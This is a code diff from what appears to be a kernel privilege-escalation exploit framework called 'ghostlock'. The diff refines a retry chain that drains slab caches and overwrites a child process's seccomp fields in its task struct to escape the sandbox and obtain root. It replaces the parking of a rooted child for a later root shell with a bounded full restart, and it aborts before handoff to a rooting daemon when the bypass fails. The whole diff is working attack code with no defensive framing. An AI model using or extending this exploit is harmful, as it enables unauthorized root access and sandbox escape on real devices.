@@ -90,23 +90,18 @@ namespace ghostlock::session::backend {
             return verify(context) != 0;
         }
 
-        /* W3 chain retry: park the previous rooted child on its command pipe so the
-         * late-load stage can still start a root shell from it. */
-        void park_retry_child(ExploitSession &session, VictimChain &chain,
-                              const uint32_t round, const uint32_t chain_rounds) {
+        /* W3 full restart: retire the previous rooted child before creating a new
+         * victim. A child whose seccomp state was not verified must not survive
+         * into the handoff path. */
+        void retire_retry_child(ExploitSession &session, VictimChain &chain,
+                                const uint32_t round, const uint32_t chain_rounds) {
             victim::VictimContext &pipes = session.victim;
-            pr_warning("W3 chain retry %u/%u: parking rooted child\n",
+            pr_warning("W3 full restart %u/%u: retiring unverified child\n",
                        round, chain_rounds);
-            if (chain.child_alive && pipes.child() > 0) {
-                write(pipes.cmd_write.get(), "P", 1);
-                usleep(50000);
-                session.parked_victim = pipes.release_child();
-                session.parked_victim_cmd = std::move(pipes.cmd_write);
-            } else {
-                pipes.cmd_write.reset();
-            }
+            if (chain.child_alive) pipes.retire_child();
+            pipes.cmd_write.reset();
             pipes.uid_read.reset();
-            chain.child_alive = 1;
+            chain.child_alive = 0;
             chain.seccomp_ok = 0;
         }
 
@@ -290,7 +285,8 @@ namespace ghostlock::session::backend {
                                         ? child_task + ghostlock::profile::task_seccomp_off() - 8
                                         : child_task + ghostlock::profile::task_seccomp_off();
 
-            uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
+            constexpr uint32_t kW3Attempts = 3;
+            const uint32_t w3_attempts = kW3Attempts;
             for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
                 pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
                 if (attempt == 1) attack::slab_drain();
@@ -317,7 +313,7 @@ namespace ghostlock::session::backend {
                 support::run_state::complete("w3c");
                 usleep(g_exploit_session.profile.w3_settle_us());
                 int32_t st = 0;
-                if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
+                if (pipes.child() > 0 && waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
                     pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
                     pipes.mark_child_exited();
                     child_alive = 0;
@@ -520,14 +516,16 @@ namespace ghostlock::session::backend {
                 break;
         }
 
-        /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
-         * child, so respawn and redo. */
+        /* W2+W3 as a bounded full-restart chain: a missed W3 write or probe
+         * retires the unverified child, so the complete W2+W3 sequence restarts. */
         attack::slab_drain();
         attack::timer_mark("pre-W2 drain");
         victim::w2_stage_context w2_context = {.pipes = session.victim};
-        const uint32_t chain_rounds = g_exploit_session.profile.w3_chain_rounds();
+        constexpr uint32_t kFullRestartLimit = 2;
+        constexpr uint32_t kChainRounds = 1 + kFullRestartLimit;
+        const uint32_t chain_rounds = kChainRounds;
         for (uint32_t round = 1; round <= chain_rounds; round++) {
-            if (round > 1) park_retry_child(session, chain, round, chain_rounds);
+            if (round > 1) retire_retry_child(session, chain, round, chain_rounds);
 
             uintptr_t child_task = 0;
             const VictimRound rooted = w2<M>(session, chain, w2_context, child_task);
@@ -536,8 +534,9 @@ namespace ghostlock::session::backend {
             if (w3<M>(session, chain, w2_context, child_task)) break;
         }
         if (!chain.seccomp_ok) {
-            pr_warning("W3 seccomp bypass failed after %u chain rounds; ksud late-load will likely stay blocked\n",
+            pr_error("W3 seccomp verification failed after %u full W2/W3 runs; stopping before handoff\n",
                        chain_rounds);
+            return StageResult::Failed;
         }
         /* The frontend handoff step finishes the run. */
         return StageResult::Continue;
